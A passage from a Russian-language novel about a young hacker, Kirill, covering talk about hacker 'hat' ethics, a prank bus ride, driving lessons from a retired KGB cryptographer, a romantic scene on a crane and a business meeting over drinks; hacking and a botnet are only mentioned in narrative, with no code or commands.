них кому то придется все это разгребать.
  Он чуть наклонился вперед.
 — А белая шляпа — это люди, ломающие из любопытства. Они помогают,
а не вредят. И когда случайно находят уязвимость — дают возможность ее
закрыть. Иногда даже не ждут благодарности, порой делают это под угрозой
ареста или суда, но все равно стараются поступать так, чтобы принести в этот
мир поменьше зла. Вот считай, что прямо сейчас ты сидишь не в этом под‐
вале, а посреди зала магической школы, как тот юный волшебник со шляпой
на голове. И тебе предстоит сделать свой выбор.
 — А ты, значит, весь в белом, — с вызовом предположил Иван.
 — Бывают еще серые шляпы, — усмехнулся Кирилл. — Это те, кто умеют
ломать и ломают, но при этом чувствуют грань. Иногда переступают через
нее, иногда возвращаются обратно. Сегодня они подсказали админу, где
искать дыру, завтра — проверили, закрыл ли он ее. Но чаще они делают
это просто ради того, чтобы лишний раз проверить себя.
 — Вообще‑то этот чувак у нас тут разгром устроил, — обиженно напомнил
Ваня.
 — И чем ты тогда от него отличаешься?
   Недовольно набычившись, Иван вернулся к клавиатуре. Текст он начал
печатать медленно, по одному слову: объяснение уязвимости, путь к файлу,
скопированная из  Гугла инструкция по настройкам прав. Однако дойдя
до точки, он неожиданно замер. Письмо было готово — можно отправлять.
Но парень лишь сжал губы, щелкнул мышью, закрыл окно почтового клиента
и открыл вместо него вкладку, где все еще крутился веб‑шелл. Он создал
новый текстовый файл с именем readme.txt, вставил туда текст послания,
перечитал, усмехнулся уголком рта, как будто этим маленьким жестом воз‐
вращал себе моральное равновесие, и отправил файлик в ту же папку,
в которой до этого сохранил свой вредоносный скрипт. Никаких покаянных
писем администратору: он просто оставил подсказку там же, где наследил.
Захочет — найдет, не сможет — сам виноват.
   Кирилл хмыкнул, но без осуждения.
 — Талант у этого юноши чувствую я, — процитировал он слова известного
зеленолицего киногероя, — туманно будущее, но несдержанность привести
его может к темной стороне…
 — Да иди ты, — беззлобно огрызнулся Иван, — тоже мне, Йода нашелся.
Мне пофиг, какая шляпа, хоть серая, хоть фиолетовая. Я сделал, как ты хотел,
этого достаточно.
  И в его показном упрямстве Кирилл  почувствовал что‑то знакомое:
желание поступить по совести и стремление при этом не выглядеть уж слиш‐
ком правильным.
 — Ладно, — сказал он наконец, — это тоже вариант. Лучше, чем ничего.
 — Кстати, ты мне проспорил желание, помнишь? — пристально посмотрел
на него Иван. — Пора отдавать должок.

                       ***

— Короче, так, — начал командовать Ваня, и, судя по всему, этот процесс
доставлял ему истинное наслаждение, — ты лезешь на переднюю площадку, я
поеду на задней. Башмаки я твои с собой заберу. Запомни: не меньше трех
остановок, понял?
 — Понял, — печально вздохнув, кивнул Кирилл.
   Задача выглядела несложной: он должен был сесть в рейсовый автобус
и проехать на нем в сторону центра эти самые три остановки. Ситуацию чуть
осложняло лишь два обстоятельства: уже наступил вечерний час пик и отпра‐
виться в столь увлекательное путешествие Кириллу предстояло в резиновых
ластах, которые любезно одолжил ему на этот вечер Ваня. Серёга и Маша
стояли чуть поодаль, с интересом наблюдая за происходящим — такое бес‐
платное представление они пропустить никак не могли.
   Кирилл огляделся: народу на остановке было немного. Весна уже вступила
в свои права — клонившееся к закату солнце играло веселыми бликами
в лужах, а на подсыхающих газонах проклюнулась первая  трава. Из‑за
поворота показался автобус. Снова вздохнув, Кирилл снял ботинки, протянул
их Ивану и, чуть подумав, скинул следом носки, а затем натянул на босые ноги
ласты. С размером Ваня немного не угадал: холодная резина больно сдавила
пальцы.
   Забираясь по ступеням в переполненный салон, Кирилл несколько раз
едва не кувырнулся наземь, но задачу‑минимум все‑таки выполнил. Двери
с шипением закрылись, автобус тронулся, и пассажиры, толкаясь, принялись
наступать ему на ноги. Кто‑то пихнул его локтем, протискиваясь к выходу,
кто‑то, чертыхнувшись, споткнулся о занявшую половину узкого прохода
резиновую лопасть. Первую остановку окружающие молчали, неприязненно
поглядывая в его сторону, на второй — начали недовольно переговариваться
и роптать. Наконец какой‑то невысокий коренастый мужик с простецким
лицом не выдержал:
 — Эй, парень! Ты чего, псих, что ли?





Несколько десятков лиц с требовательным любопытством повернулись в его
сторону, в салоне явно сгустилось напряжение.
   Кирилл призвал на помощь всю свою смекалку. Что бы сделал в его
положении великий Кевин Митник? Все‑таки тот не зря считается гениальным
манипулятором, Кириллу до его таланта ох как далеко. Придется мобили‐
зовать все имеющиеся в запасе крохи актерского мастерства, чтобы ему
вновь не набили морду…
 — Извините, пожалуйста, я, наверное, всем тут мешаю, — скромно опус‐
тив взор, произнес он. — Но деваться мне некуда, сами посудите. Я в бас‐
сейн хожу, два раза в неделю занимаюсь, мне для здоровья надо. Сегодня
вот опять пошел, и, пока плавал, какая‑то сволочь в раздевалке мои ботинки
сперла. Только одни ласты и остались. Не могу же я домой босиком идти,
на улице еще холодно и грязно…
    Кажется, его экспромт возымел действие: какая‑то женщина средних лет
в старомодном  платочке  сочувственно покачала головой, обратившийся
к нему мужик вроде бы тоже проникся.
 — Ну, ты это, не расстраивайся сильно, — смущенно сказал он. — Ботин‐
ки‑то ладно, у меня вон как‑то сумку с половиной зарплаты украли…
 — Хорошие ботинки были, — всхлипнув, продолжил ломать комедию
Кирилл, — немецкие, коричневые, с черными кожаными вставками… Мама
меня за них убьет теперь, наверное.
  Он уже вошел в роль, поэтому слова давались легко, а образ пострадав‐
шего спортсмена‑неудачника, кажется, получился правдоподобным. Жен‐
щина в платочке, всплеснув руками, пробормотала что‑то вроде «бедный
мальчик». Кирилл уже тихо порадовался своей находчивости, но не тут‑то
было.
 — Эй, мужики, — послышался чей‑то голос с задней площадки, — а здесь
какой‑то гопник с ботинками в руках едет. Коричневыми, с черными кожаными
вставками. Не он ли их у того парня украл?
 — Точно он!
  В хвосте автобуса послышалась какая‑то нездоровая возня. Едва тран‐
спорт подкатил к остановке и распахнул двери, Иван с ботинками в руках выс‐
кочил на улицу и кинулся наутек. Следом за ним выскочили двое сурового
вида мужиков и с воплями «держи вора!» устремились следом. Замыкал про‐
цессию Кирилл: весело шлепая ластами по асфальту, он тщетно пытался дог‐
нать улепетывающую троицу.
 — Стойте! Да стойте же! — кричал он им вслед.
   Куда там: Иван и его преследователи уже скрылись за ближайшим поворо‐
том.
   Автобус чихнул и закрыл двери, собираясь отъехать от остановки. Рас‐
терянно  остановившийся  посреди  тротуара Кирилл  успел  рассмотреть
за стеклом корчащихся от смеха Серёгу и Машу. © X
GEEK





— За рулем раньше сидел когда‑нибудь?


   Толстый седой инструктор был чем‑то похож на свою машину — слегка
потрепанную и  повидавшую  жизнь  «копейку»,  крышу  которой  венчала
пирамидка с буквами У в белых треугольниках.
 — Не доводилось, — честно признался Кирилл.
 — Ладно, заводи, поехали.
   Кирилл провернул ключ в замке зажигания, позабыв снять автомобиль
с передачи, — тот беспомощно дернулся и застыл на месте. Инструктор
с безразличием смотрел в окно: обучать чему‑то того, кто сидел в водитель‐
ском  кресле, он был явно не намерен. Спустя  несколько безуспешных
попыток Кириллу все же удалось снова запустить мотор и тронуться с места,
но «копейка» все равно двигалась рывками, совершенно не желая ехать плав‐
но. Управляться сразу с тремя педалями, рычагом коробки передач и рулем
оказалось куда сложнее, чем с двумя кнопками и колесиком мыши.
 — Вон у того ларька притормози, выйду сигарет куплю, — скомандовал
инструктор.
   Кирилл резко нажал на тормоз, и «жигули» снова заглохли. Чертыхнув‐
шись, инструктор выбрался из машины, взял себе в ближайшем уличном
павильоне пачку «Бонда», но возвращаться не спешил. Постоял, покурил,
потом вдруг поприветствовал какого‑то проходившего мимо мужика, и они
принялись увлеченно трепаться. Обратно в салон он забрался примерно
через полчаса, приказал Кириллу проехать еще немного вперед по переулку,
развернуться, после чего сообщил, что на этом занятие окончено. Из отве‐
денных на вождение шестидесяти минут Кирилл с грехом пополам отъездил
в лучшем случае двадцать.
   Домой он возвращался не в лучшем расположении духа. Навыков управле‐
ния машиной у него не было абсолютно никаких, и приобрести их на подоб‐
ных занятиях, судя по всему, уже не получится. Кирилл подумывал было зайти
по пути в автошколу и попроситься к другому наставнику, но вспомнил, о чем
их предупреждали, когда распределяли по группам: учебных машин и инс‐
трукторов катастрофически мало, желающих, наоборот, много. Крутитесь
как хотите. Своей отстраненностью и полнейшим безразличием инструктор,
очевидно, намекал на необходимость дать ему на лапу, но Кирилла такой
подход откровенно бесил. Взялся что‑то делать — ну так делай это хорошо,
очевидный саботаж в расчете на взятку вызывал у него почти физическое
отторжение. Он не был наивным подростком и прекрасно понимал, как здесь
все устроено, однако одно дело — знать и совсем другое — столкнуться
с этим лично. В голове у Кирилла сегодняшнее занятие плохо стыковалось
с самой идеей обучения: если человек сидит рядом и формально отвечает
за твою безопасность, превращать процесс в фарс ради конверта с хрус‐
тящими купюрами — это уже не мелкая бытовая хитрость, а самая настоящая
подстава.
 — Привет, Кирилл. Что‑то ты сегодня смурной какой‑то. Случилось чего?
   Борис Семенович был, как всегда, бодр и подтянут: судя по полному
пакету продуктов, он как раз возвращался из магазина и сейчас стоял у двери
своей квартиры, выискивая в кармане ключ.
 — У меня через два месяца экзамен по вождению, а инструктор откровен‐
но динамит, — пожаловался Кирилл, — не знаю, как сдавать буду. Наверное,
придется и дальше пешком ходить, доплачивать ему я не собираюсь.
Не потому, что денег жалко, дело принципа.
 — А ну‑ка, зайди ко мне, — деловито распорядился сосед.
   Кирилл шагнул в тесную прихожую вслед за ним и замер в нерешительнос‐
ти.
 — Там, в верхнем ящике стола, в комнате, связка ключей лежит, — пос‐
лышалось с кухни. Судя по доносившимся оттуда звукам, Борис Семенович
уже хозяйничал у холодильника, методично расставляя покупки по полкам. —
Возьми, пока я тут вожусь.
   Кирилл разулся и прошел в единственную комнату. Скрипучий ящик под‐
дался не сразу, будто нехотя раскрывая свое содержимое. Связка ключей
лежала на самом виду, но взгляд его зацепился за предмет рядом — позоло‐
ченный значок в квадратном пластиковом футляре.
   Знак имел форму щита с алой лентой, прикрывающей меч, направленный
острием вниз. Поверх клинка — круглый медальон с легко узнаваемым про‐
филем Дзержинского. На ленте коротко значилось: «Ветеран», рядом кра‐
совались выпуклые буквы «КГБ СССР».
 — Я криптографом трудился, людей в лагеря не отправлял, если ты
об этом подумал, — Борис Семенович стоял в дверях, с усмешкой наблюдая
за замешательством Кирилла. — Восьмое главное управление, оно же крип‐
тографическая служба, Кирюша, — это был «щит и меч» в области связи
и  информации. Мы  создавали  системы  шифрования  для  партийных
и государственных органов, армии, дипломатов, ну и криптоанализом нем‐
ного занимались. Это значит вскрытие шифрованной переписки иностранных
государств, их посольств и спецслужб. Работа непростая, но крайне интерес‐
ная. И главное, полезная для нужд государства.
   Так вот откуда у Криптодеда такие глубокие познания в области шифров,
ключей и алгоритмов. Да и поразительная ясность ума в его немолодом воз‐
расте, видимо, тоже одно из  следствий  службы, где без  постоянного
интеллектуального напряжения надолго не задержишься. Годы работы с абс‐
тракциями, логическими связями и сложным математическим аппаратом
не проходят бесследно: мозг привыкает держать форму, будто хорошо нат‐
ренированные мышцы профессионального спортсмена. Теперь все встало
на свои места, и Кирилл даже почувствовал себя немного не в своей тарелке:
в подобных организациях трудились такие серьезные спецы, до уровня
которых сам он вряд ли смог бы когда‑нибудь дотянуться.
 — Я на пенсии давно, — успокоил его Борис Семенович, — так что теперь
круг моих интересов ограничивается исключительно просмотром телевизора
и разгадыванием кроссвордов по вечерам. Пойдем, хочу показать тебе
кое‑что.
   Сосед запер квартиру, и они спустились во двор. Он повел Кирилла вглубь
квартала, но, не доходя до берега речушки, свернул налево, туда, где вид‐
нелись среди пока еще голых деревьев крыши частного сектора. Здесь Борис
Семенович снова свернул, ненадолго остановился возле шлагбаума вытянув‐
шегося вдоль реки  гаражного  кооператива,  перебросился парой слов
с сидевшим в будке стариком‑вахтером, явно давним знакомым, после чего
сделал знак рукой: пойдем дальше. Попетляв по проездам, Криптодед отпер
ключом из той самой связки двери неприметного гаража, за которыми взору
Кирилла предстал блестящий синими лакированными боками «москвич» —
старенький, еще с ленинградскими номерами, но вполне себе крепкий.





— Ух ты, — восхищенно произнес Кирилл, разглядывая раритетный авто‐
мобиль. — Кажется, это двадцать один сорок?
 — Эс эль, — с гордостью добавил Борис Семенович, — что означает
«Суперлюкс». Премиальная экспортная модель, между прочим, почти ино‐
марка. А знаешь, как расшифровывается название, которое у нее на решетке
спереди написано, — АЗЛК?
 — Автозавод ленинского комсомола? — блеснул эрудицией Кирилл.
 — Можно и так  сказать. Но владельцы чаще говорили «автомобиль,
заранее лишенный качества» или «автомобиль, задолбавший любого кли‐
ента» — выбирай, что тебе больше нравится. Это я к тому, что «москвич» —
тот еще чемодан с веселыми сюрпризами. Но если за ним следить и как сле‐
дует ухаживать, будет служить долго.
   Борис Семенович открыл водительскую дверь. Машина легко завелась и,
зарычав двигателем, мягко выкатилась из гаража.
 — Садись за руль, — предложил сосед, перебираясь на пассажирское
место, — буду тебя премудростям шоферского мастерства учить.
   Кирилл послушался. Сиденья в экспортном «москвиче» оказались мягкими
и удобными. Особенно его поразил механизм открывания дверей: не привыч‐
ная ручка, которую нужно тянуть на себя, а поворачивающийся рычаг, как у
стеклоподъемника. Очень интересная конструкция.
 — Упражнение первое: поддай правой ногой газку, а сам следи за стрел‐
кой тахометра, чтобы она замерла на полутора тысячах оборотов. И сам зам‐
ри, держи газ ровно. Повторяй, пока не скажу, что хватит.
   Кирилл послушно выполнил инструкцию, раз, другой, третий. Минут через
пятнадцать у него начало получаться: нога уверенно нажимала педаль с тре‐
буемым усилием, заставляя обороты, которые поначалу скакали и плавали,
сохранять стабильную величину.
 — Хорошо, теперь поработаем левой ногой. Газ пока не трогай, вместо
этого  нажми  сцепление и  включи  первую  передачу. Теперь медленно
отпускай сцепление, пока не  почувствуешь, что машина вот‑вот готова
поехать. В этот самый момент выжимай сцепление обратно до пола и перек‐
лючайся на нейтралку.
   Это упражнение далось немного  сложнее: пару раз Кирилл  заглох,
отпустив педаль чуть сильнее, чем нужно, но вскоре научился ощущать едва
уловимый момент срабатывания механизма.
 — А теперь соединим эти два упражнения в одно, — продолжил инструк‐
тировать Борис Семенович. — Левой ногой повторяешь то же самое, что
делал последние двадцать минут, а правой — как в самом начале, даешь газу
на полторы тысячи оборотов и держишь, не отпуская. Давай.
   Кирилл выполнил указанные действия, и автомобиль плавно тронулся
с места — мягко, неторопливо, без рывков.
 — Вторую втыкай, — с довольным видом скомандовал сосед.
   «Москвич» ехал, покачиваясь на ухабах, как пассажирский лайнер на вол‐
нах. Гаражный кооператив был похож на маленький городок со своими прос‐
пектами, переулками и даже парой площадей, на одной из которых громоз‐
дилась ржавая эстакада. Кирилл неторопливо катался по ним, сворачивая то
направо, то налево, и понемногу ощущал, как сердце охватывает восторг:
машина  прекрасно  слушалась  руля, а  у  него  отлично  получалось ей
управлять. Минут через сорок он с сожалением остановился возле ворот
гаража и заглушил двигатель.
 — Спасибо вам огромное, — прочувствованно произнес Кирилл, отдавая
ключи хозяину автомобиля, — без вашей помощи я бы даже не тронулся
с места.
 — Оставь себе, — махнул рукой Борис Семенович.
 — В смысле?
 — В прямом, — сосед порылся в кармане и протянул Кириллу зеленую
книжечку  технического  паспорта. — Я теперь из дома  редко выхожу,
до магазина только, а пешком гулять мне сейчас полезнее. Да и зрение уже
не то, вижу с каждым годом все хуже. Старый стал. Раньше еще на дачу ездил,
но Светлана Михайловна, жена моя, умерла четыре года назад. Она в ого‐
роде да в теплице чего‑то сажала раньше, только вот мне одному на даче
делать больше нечего. В общем, машина стоит в гараже без движения. Бери,
тренируйся понемногу, только за ворота не выезжай, пока права не получишь.
 — Так может, я ее у вас выкуплю? — предложил Кирилл, которому вдруг
сделалось жутко неудобно принимать столь щедрое предложение.
   Мысленно прикинув свои текущие финансовые возможности, он добавил:
 — Ну, постепенно.
 — Ты на права сначала сдай, — ворчливо ответил Борис Семенович и с
кряхтением выбрался с пассажирского сиденья. — А потом поговорим.





Включив ноут, Кирилл соединился с недавно созданным управляющим сер‐
вером и открыл окошко статистики. Сто тридцать пять тысяч зараженных хос‐
тов — немало для ботнета. Сейчас вредоносы на этих машинах мирно спали,
но в любой момент могли проснуться и начать действовать, достаточно
отдать им короткую команду. Вот интересно: Лиам затеял всю эту авантюру
по собственной  инициативе или он все еще каким‑то образом  связан
с TerraCore? Если так, бороться с крупной корпорацией будет ой как неп‐
росто… С другой стороны, «Перцептрон», который Фреш называл искусс‐
твенным интеллектом, — это  всего лишь очень  громоздкая и сложная
экспертная система, которую однажды ему уже удалось обмануть. Если
попытаться каким‑то образом отобрать у создателей пульт управления их
«кибероружием», то это станет наглядным примером, почему играть в подоб‐
ные игрушки слишком опасно…
   Додумать эту мысль Кирилл не успел: в дверь настойчиво позвонили.
 — Привет! — Маша выглядела просто обворожительно: темные локоны
разбросаны по плечам, неяркая помада, из‑под короткой весенней куртки
виднеются обутые в кроссовки стройные ножки в черных колготках. — Погода
сегодня отличная, я вот подумала: пойдем погуляем?
 — А пойдем, — легко согласился Кирилл.
  До вечера еще оставалась уйма времени, в клубе сегодня хозяйничал
Сергей, поэтому торчать дома было бы глупо.
  Они вышли из подъезда, и Кирилл подставил лицо весенним солнечным
лучам. Звонко чирикали воробьи, барахтаясь в луже, в воздухе уже ощущался
смолянистый запах готовой распуститься листвы, а на ветвях ближайших
деревьев он разглядел проклюнувшиеся зеленые ростки.
  Она шла рядом, время от времени задевая его локтем, и Кирилл отметил,
что «случайность» повторяется уж слишком регулярно. Но от этих прикос‐
новений  внутри разливалось приятное  тепло. Она что‑то  рассказывала
про учебу, про подругу из Краснодара, внезапно решившую приехать к ней
в Питер, про смешной случай в магазине, и он кивал, ловя себя на том, что
слушает не столько слова, сколько интонации.
 — Ты сегодня какой‑то задумчивый, — заметила Маша, прищурившись. —
Опять твои компьютеры покоя не дают?
 — Просто наслаждаюсь моментом, — честно признался он, сам удивив‐
шись тому, как легко это прозвучало.
 — Смотри, — сказала Маша, замедляя шаг.





Они остановились возле старого бетонного забора, сплошь заклеенного
объявлениями и исписанного граффити, за которым громоздились потем‐
невшие от времени фанерные вагончики и высилась ажурная конструкция
крана. Когда‑то давно тут началась стройка, но замерла на этапе фундамен‐
та, после чего люди покинули это место, прихватив с собой наиболее ценную
технику.
 — Кирюха, а ты кем мечтал стать в детстве? — спросила она без особой
интонации, будто между делом.
  Он на секунду задумался, глядя сквозь щели в заборе. Кран стоял непод‐
вижно, как забытый скелет доисторического зверя, и в этом застывшем пей‐
заже ему виделось что‑то постапокалиптическое.
 — Летчиком, как мой отец.
 — Он сейчас где‑то летает, да? Пассажиров возит?
 — Он погиб. Разбился в девяносто восьмом.
 — Извини… — Маша коснулась его плеча. — А я вот в детстве, ты только
не смейся, хотела крановщицей работать. Не, серьезно! Прикинь: сидишь
там наверху, весь мир под тобой как на ладони, а ты дергаешь рычаги и дви‐
гаешь всякие огромные штуки. Ну прикольно же! Пойдем…
  Она ловко протиснулась в дыру между бетонными плитами, подбежала
к строительному крану и, ухватившись за железные поручни, принялась стре‐
мительно карабкаться по узкой лестнице вверх. Кирилл старался не отста‐
вать. Где‑то на уровне десятка метров над землей он уже пожалел о том, что
согласился на эту прогулку: здесь задувал холодный ветер, кран ощутимо
качался под его порывами, а стальная конструкция жалобно скрипела и пот‐
рескивала, создавая ощущение, что вот сейчас вся эта громада сложится
пополам и рухнет наземь. Но девчонка как ни в чем не бывало продолжала
лезть выше, и  Кириллу  оставалось лишь  быстрее  перебирать руками
и ногами.
   Лестница стала еще уже и круче, превратившись в тесный тоннель, обра‐
зованный металлическими кольцами и сваренными из стальных труб перек‐
ладинами. Последний десяток метров Кирилл преодолел, стараясь не смот‐
реть вниз. Кабина была приоткрыта, перед ней имелась крошечная площадка,
похожая на  клетку для хищников. Кирилл зашел в тесную  будку вслед
за девушкой, прикрыв дверь за спиной. Здесь по крайней мере не ощущался
стылый ветер, и он наконец осмотрелся.
  Вид с высоты и вправду открывался изумительный. Вдалеке поблескивала
на солнце излучина реки, по берегам которой теснились коробки многоэта‐
жек и крыши частных домов. На той стороне дымили корпуса завода, и лох‐
матые белые  клубы, поднимаясь из его труб, постепенно растворялись
в весеннем небе, смешиваясь с редкими облаками. Обернувшись, он даже
разглядел свой дом, но насладиться зрелищем не успел. Маша прильнула
к нему, прижалась всем телом, обхватив руками шею и обдав его тонким
лавандово‑мятным ароматом. Ее губы жадно впились в его, Кирилл почувс‐
твовал ее язычок на своих зубах. Его рука скользнула вниз. Черные колготки
оказались чулками, над которыми пальцы нащупали гладкую теплую кожу
и тонкую ткань трусиков…
 — Знаешь, я впервые занималась любовью в таком непривычном мес‐
те, — сказала она, когда они наконец спустились на землю.
 — Я тоже, — честно признался Кирилл.
 — Получается… — Маша заглянула в его глаза, — у нас теперь отно‐
шения?
 — Высокие, — кивнул он. — Как подъемный кран.
 — Я, между прочим, серьезно спрашиваю, а тебе бы только прикалывать‐
ся, — девушка больно ткнула его кулаком в бок.
 — Будь выше  этого, дорогая, — сказал он, сохраняя невозмутимое
выражение лица.
   Маша вздохнула, но на губах у нее все‑таки мелькнула улыбка.
 — Мне важно, чтобы все было по‑настоящему, а не «посмотрим, как пой‐
дет».
 — Тогда давай обходиться без временных конструкций, — кивнул он. —
Без лесов и подпорок. Если уж строить — то капитально, чтобы процесс
не завис на этапе котлована, как вот тут…
 — Кстати, о стройках, — оживилась Маша, — ты обои и грунтовку купил?
Нет? А почему? Я тебе еще в прошлый раз список составила, можно было
поднять задницу из‑за компа и дойти до магазина. Так, сколько сейчас?
Строительный еще открыт, если поспешим, то успеем… © X
GEEK





— Семьсот двадцать, семьсот тридцать, семьсот сорок,
семьсот пятьдесят… На, пересчитай.


   Стас протянул Кириллу толстую пачку долларов, в которой затесалась
пара соток, но в основном присутствовали замусоленные десятки и пятерки.
Тот, не глядя, свернул ее пополам и сунул в карман.
 — Я тебе верю. Но вот за балаган, который ты в процессе работы устроил,
стоило бы поднять тебе цену минимум вдвое. В качестве компенсации
морального вреда. То одно тебе добавь, то другое, то свистелку, то сбоку
бантик. Нервы ты нам помотал изрядно.
 — Да ладно, — Стас блеснул своими глубоко посаженными глазками, — я
личность творческая, мне можно. А насчет морального вреда… Тут мои
кореша с тобой побазарить хотят.
 — Что за кореша? — напрягся Кирилл.
 — А вот увидишь, — как‑то недобро ухмыльнулся Стас. — Да ты не ссы,
нормально все будет. Парни хорошие. Гостиница «Москва» знаешь, где
находится? Вот, подгребай туда часам к восьми вечера, посидим,  пот‐
рещим…





Гостиница «Москва», выходившая окнами на площадь Александра Невского,
напоминала издалека Великую Китайскую стену, отлитую из серого бетона
и голубого стекла. Прямо перед ней замер на гранитном постаменте сам свя‐
той благоверный великий князь верхом на бронзовом коне. Кто‑то из зна‐
комых рассказывал, что памятник торжественно открыли где‑то года четыре
назад и за его создание, по слухам, активно ратовали обитатели Алексан‐
дро‑Невской лавры. Правда, развернут монумент почему‑то был фронтендом
к «Макдональдсу», а бэкендом — к куполам Свято‑Троицкого собора, где
ныне покоились княжеские мощи.
   Кирилл выбрался из метро, обогнул выходившую на площадь часть отеля,
на первом этаже которого теснились сувенирные лавки, вошел в холл и под‐
нялся по лестнице на второй этаж, где располагался местный ресторан. Ста‐
са он обнаружил за одним из столиков в компании двух очень смуглых тем‐
новолосых мужчин. Перед ними стояла початая бутылка джина, несколько
бутылочек поменьше, судя по этикеткам — со швепсом, и большая тарелка
с закуской в виде тонко нарезанной колбасы. Спутники Стаса, несмотря
на восточную внешность, алкоголь употребляли не смущаясь, о чем сви‐
детельствовали присутствовавшие тут же влажные стопки, сам же Стас,
по всей видимости, был уже изрядно навеселе.





— О, а вот и он, тот парень, о котором я говорил! — Стас махнул рукой и пох‐
лопал ладонью по кожаной спинке дивана рядом с собой. — Падай сюда.
Знакомься: это Адиль, это Омар, два брата‑акробата. Они из Алжира,
но по‑русски говорят неплохо. Джин будешь? Или текилы тебе заказать?
Девушка, притащите еще один стаканчик, пожалуйста! И еще одну мясную
тарелку.
  На его призыв явилась официантка, несущая на подносе искомое.
 — Кирюха у нас просто компьютерный мегамозг, — озонируя пространс‐
тво хвойным перегаром, доверительно сообщил своим спутникам Стас, —
офигенный магазин нам забубенил, вообще атас, даже у Егорова с Рудако‐
вым такого нет! Короче, чел что надо. А с этими парнями…
   Теперь Стас повернулся к Кириллу:
 — А с этими парнями мы в институтской общаге жили.
 — Ты учился в институте? — удивленно спросил Кирилл.
  По внешности и повадкам Стаса, который изо всех сил старался походить
на мелкого мафиози из какого‑нибудь фильма про русских бандитов, пред‐
положить наличие у него высшего образования было сложно.
 — Да ты чё, — хохотнул он, — я ж ЛЭТИ заканчивал. Даже в аспирантуру
потом поступил, но забрал документы. На последнем курсе я на вещевом
рынке шмотками торговать начал туда‑сюда, ну и дело пошло. Решил барыгой
стать. Сам я с Кемерово, так что, пока учился, жил в общаге на одном этаже
вот с этими вот гражданами алжирской национальности… Знаешь, как мы
подружились? Выпей, ща расскажу.
   Кирилл разбавил швепсом щедро налитый ему в стопку джин, глотнул, и по
горлу разлилась приятная огненная волна.
 — На вот колбаски, закуси, — заботливо протянул ему тарелку Стас
и начал повествование: — Короче, чтоб ты знал, эти ребята жопу в сортире
бумагой не вытирают. Они подмываются, национальная традиция такая. Зем‐
ляков Адиля с Омаром у нас в общаге много жило, и у каждого была плас‐
тиковая бутылочка с водой, именная, блин. Бутылочки эти они в тубзике
оставляли.  Прикинь? Заходишь  в  кабинку,  дверцу  открываешь, и  все
это барахло падает тебе под ноги, а потом раскатывается по полу в разные
стороны… Задолбало, сил нет. Ну, таскали бы они свои бутылки с собой,
в натуре, вместо того чтобы в уборной склад устраивать! Так нет же. Один раз
им сказал: мужики, имейте совесть, другие люди тоже сортиром нормально
пользоваться  хотят,  второй раз  сказал,  третий… Им пофиг, моя твоя
не понимай… Еще колбасы? Нет?
   Кирилл отрицательно покачал головой, ожидая продолжения рассказа,
и оно не заставило себя ждать:
 — В общем, пошел я на овощной базар и купил там большой пакет
молотого красного перца…
  Омар закрыл лицо руками и затрясся в беззвучном смехе, видимо в крас‐
ках припомнив эту историю. Стас бесцеремонно ткнул в него пальцем:
 — Первым мимо моей комнаты вот этот тип пробежал, со спущенными
штанами и глазами навыкате. Следом за ним другой его кореш. Короче,
одного раза им хватило, чтобы отучились оставлять свои гигиенические при‐
надлежности где попало.
 — И что, никто не попытался отблагодарить тебя за этот урок хороших
манер? — поинтересовался Кирилл, вдоволь отсмеявшись.
 — Давай, расскажи ему, как мы тебе в борщ нассали, — толкнул Стаса
плечом Омар.
 — Ну, по факту‑то вышло, что не мне, — отозвался тот, и все трое зар‐
жали. — Но потом мы с ними поболтали, нормальные парни оказались, пра‐
вильные… Давайте выпьем, что ли? За дружбу!
   Кирилл разбавил еще одну порцию джина, чокнулся со своими новыми
знакомыми и опрокинул пахнущий горькой хвоей напиток в рот.
 — Стас сказаль, ты болшой специалист по сайтам, — обратился к нему
Адиль на ломаном русском, чуть смягчая согласные в конце слов и, наоборот,
произнося их жестче, чем надо, в середине. — Я в Америке сейчас живу, у нас
делять сайты очень дорого стоит. Простой сайт одна‑две страница может
стоить тысяча долляров даже. Ты можешь делять их для меня дешевле, а я
буду поставлять тебе заказы и плятить. Будешь делять хорошо, будет много
заказов. И много долляров.
 — Как платить собираетесь? — сразу же перевел беседу в деловое русло
Кирилл.
 — «Вестерн Юнион». Знаешь такой?
 — Конечно, — кивнул Кирилл: об этой системе денежных переводов он
был наслышан. — Но для каждого сайта мы будем утверждать подробное тех‐
ническое задание и сроки, причем письменно.
 — Без проблем. Мой бират Омар живет в Россия, он, если что, сможет
обсуждать каждый деталь здесь. Сколько ты берешь в час?
   Этот простой вопрос застал Кирилла врасплох. Он же не проститутка, что‐
бы оценивать свой труд почасовым тарифом? Видя его замешательство,
на помощь пришел Стас:
 — Здесь мерилом работы считают усталость… — процитировал популяр‐
ную песню он. — У нас в России, Адиль, работа оценивается по результату,
а не по затраченному времени.
   Стас сцепил пальцы за головой, расставил локти и с философским видом
продолжил:
 — Все у этих американцев через известное место, честное слово. Вот
у нормальных людей один миллилитр воды занимает объем в один кубичес‐
кий сантиметр, весит один грамм, а чтобы нагреть его на один градус Цель‐
сия, потребуется одна калория энергии... Спроси американца, сколько энер‐
гии понадобится, чтобы вскипятить галлон воды комнатной температуры, и он
ответит тебе «фак офф», потому что не сможет сопоставить ни одну из име‐
ющихся в его распоряжении величин. Зато с работой все наоборот. Сто‐
имость работы  русского  программиста,  Адилюшка, зависит от  глубины
кошелька заказчика и сложности задачи, которую до этого пять человек
не смогли решить. А еще от количества твоих хотелок, близости дедлайна,
наличия других более выгодных заказов, положения звезд на небе и объема
выхлебанной накануне водяры. Вот скажи мне, сколько стоит программа?
 — Сколько часов потратиль умножить на ставка, — не задумываясь, отба‐
рабанил Адиль.
 — А если разработчик десять часов в потолок смотрел, а потом час писал
и час отлаживал? А если он не просто смотрел, а думал при этом, как твой
проект лучше реализовать? Это считается? Спроси о том же русского — и он
ответит: «А программа вообще работает? Как было задумано? Вы уверены?
Ну тогда от этого и будем плясать…»
   Стас разлил остатки джина по стопкам и убрал пустую бутылку под стол.
 — Предлагаю вам не маяться фигней и делать так: Адиль выкатывает
задачу, Кирилл ее оценивает и называет стоимость, если всё всех устра‐
ивает, вы начинаете работать. Ну и можно поторговаться ради приличия.
Годится?
   Адиль неуверенно кивнул.
 — Вот за это и выпьем!





Прежде чем расстаться лучшими друзьями, они приговорили еще одну бутыл‐
ку джина. Стас заверил Кирилла, что с его приятелями вполне можно иметь
дело, а эта встреча — эдакая форма его личной компенсации за причиненные
неудобства и нервотрепку. На том и разошлись. Вечер был поздний, и, выб‐
равшись из метро, Кирилл поймал попутку — маршрутки уже не ходили,
а топать домой навеселе через вымерший с наступлением темноты район он
посчитал плохой идеей, несмотря на плескавшийся в крови алкоголь.
   Наутро он проснулся с тяжелой головой. Именно поэтому Кирилл и не
